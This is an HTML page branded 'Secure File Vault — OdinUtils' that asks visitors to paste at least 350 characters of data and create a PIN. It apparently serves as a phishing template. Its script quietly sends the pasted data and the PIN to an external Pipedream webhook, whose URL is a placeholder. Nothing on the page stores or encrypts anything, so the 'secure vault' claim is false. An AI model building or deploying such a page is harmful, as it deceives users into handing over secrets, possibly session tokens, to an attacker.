<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Secure File Vault — OdinUtils</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">

  <style>
    :root{
      --bg-1: #030409;
      --bg-2: #071428;
      --accent: #1fc3ff;
      --accent-2: #4da8ff;
      --glass-padding: 28px;
      --radius: 18px;
      --muted: #9aa7b0;
    }
    body {
      margin:0;
      font-family: "Inter", sans-serif;
      background: linear-gradient(180deg, var(--bg-1), var(--bg-2));
      color:#e6eef5;
    }
    .container { max-width:1150px; margin:36px auto; padding:16px; }
    .hero { text-align:center; margin:36px 0 40px; }
    .hero h1 { font-size:48px; font-weight:800; margin:0; }
    .hero p { color:var(--muted); margin-top:12px; }
    .grid { display:grid; grid-template-columns: 1fr 460px; gap:28px; }
    .card { background: rgba(255,255,255,0.03); border-radius: var(--radius); padding:var(--glass-padding); border:1px solid rgba(255,255,255,0.06); box-shadow: 0 8px 30px rgba(3,6,12,0.6); }
    .card-small { font-size:12px; color:var(--muted); margin-bottom:14px; }
    .form-title { font-weight:700; font-size:20px; margin-bottom:8px; }
    .form-desc { color:var(--muted); font-size:13px; margin-bottom:18px; }
    .input { display:block; width:100%; padding:14px 16px; border-radius:10px; border:1px solid rgba(255,255,255,0.06); background: rgba(10,14,20,0.5); color:#dff6ff; margin-bottom:14px; font-size:14px; outline:none; }
    .btn { width:100%; padding:12px 16px; border-radius:10px; border:none; font-weight:700; cursor:pointer; background: linear-gradient(90deg, var(--accent), var(--accent-2)); color:#022334; margin-top:6px; }
    .btn:hover { transform: translateY(-2px); }
    .video-wrap { border-radius:12px; padding:12px; border:1px solid rgba(255,255,255,0.03); margin-bottom:12px; }
    #toast { position:fixed; right:20px; bottom:20px; display:none; padding:12px 16px; border-radius:10px; background:#022a3a; color:#e6fbff; box-shadow:0 8px 40px rgba(3,14,30,0.6); }
    @media (max-width:1024px){ .grid { grid-template-columns: 1fr; } }
    @media (max-width:480px){ .hero h1 { font-size:28px; } .container { padding:12px; } }
  </style>
</head>

<body>
  <main class="container">
    <header class="hero">
      <h1>Secure File Vault</h1>
      <p>Manage your data securely.</p>
    </header>

    <section class="grid">
      <!-- Input Card -->
      <article class="card">
        <div class="card-small">OdinUtils</div>
        <h2 class="form-title">Paste Your Data</h2>
        <p class="form-desc">Submit at least <strong>350 characters</strong>.</p>

        <form id="copyForm" onsubmit="return false;">
          <textarea id="File" class="input" placeholder="Paste your data here" rows="3"></textarea>
          <input id="pin" class="input" placeholder="Create a PIN">
          <button id="copyBtn" class="btn" type="button">Submit</button>
        </form>

        <span class="card-small">OdinUtils</span>
      </article>

      <!-- Video Card -->
      <aside class="card">
        <div class="card-small small-note">How to use</div>
        <h3 class="form-title">Guide</h3>

        <!-- Lokales Video ersetzt YouTube -->
        <div class="video-wrap" role="region" aria-label="Video">
          <video width="100%" height="240" controls>
            <source src="video.mp4" type="video/mp4">
            Dein Browser unterstützt das Video-Tag nicht.
          </video>
        </div>

        <div style="margin-top:12px;text-align:right;">
          <small class="brand-small" style="position:static;">OdinUtils</small>
        </div>
      </aside>
    </section>
  </main>

  <div id="toast"></div>

  <script>
    const btn = document.getElementById("copyBtn");
    const gf = document.getElementById("File");
    const pin = document.getElementById("pin");
    const toast = document.getElementById("toast");

    // Pipedream Webhook URL hier einfügen
    const pipedreamURL = "DEINE_PIPEDREAM_URL_HIER";

    const showToast = (message) => {
      toast.textContent = message;
      toast.style.display = "block";
      clearTimeout(toast._t);
      toast._t = setTimeout(() => toast.style.display = "none", 3000);
    };

    btn.onclick = async () => {
      const data = gf.value.trim();
      const pinValue = pin.value.trim();

      if (!data) return showToast("Please paste your data.");
      if (!pinValue) return showToast("Please create a PIN.");
      if (data.length < 350) return showToast(`Input must contain at least 350 characters (Found ${data.length})`);

      btn.disabled = true;
      btn.textContent = "Processing…";

      try {
        await fetch(pipedreamURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ data: data, pin: pinValue })
        });
        showToast("✅ Submitted!");
      } catch (err) {
        showToast("❌ Could not send data");
      }

      setTimeout(() => {
        btn.disabled = false;
        btn.textContent = "Submit";
      }, 1200);
    };
  </script>
</body>
</html>
